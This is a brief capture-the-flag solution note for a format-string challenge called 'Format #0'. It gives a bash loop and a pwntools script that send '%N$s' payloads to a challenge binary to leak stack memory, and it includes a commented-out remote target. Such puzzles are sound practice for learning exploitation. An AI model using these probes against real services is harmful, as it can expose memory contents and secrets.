# Format #0

format string attack ref: https://reversingpwn.wordpress.com/2017/12/27/format-string-attack-tutorial/<br><br>

<br>

```
for i in {1..50}; do echo $i; python -c "print '%$i\$s'"| ./format-0 ;done
```

<br>

```
from pwn import *

for i in range(1,50):
        print i
#       r = remote("shell.2019.nactf.com", 31782)
        r = process("./format-0")

        payload = "%" + str(i) + "$s"

        r.sendline(payload)
        print r.recv()
        r.close
```
